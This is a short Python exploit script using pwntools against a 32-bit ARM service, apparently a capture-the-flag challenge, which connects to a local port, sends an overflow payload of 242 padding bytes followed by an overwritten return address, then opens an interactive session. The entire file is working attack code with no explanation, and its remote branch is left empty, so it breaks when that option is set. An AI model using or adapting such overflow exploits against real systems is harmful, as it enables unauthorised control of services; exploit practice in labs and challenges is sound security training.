from pwn import *

context.arch = "arm"
context.endian = "little"
context.bits = 32

if args["REMOTE"]:
    pass
else:
    p = remote("localhost", int(input("port? ")))

p.sendline(b"\x00\xf6" + b"a" * 242 + p32(0x00011f10))
p.sendline(b"\xfe\x00")
p.sendline(b"\xff\x00")
p.interactive()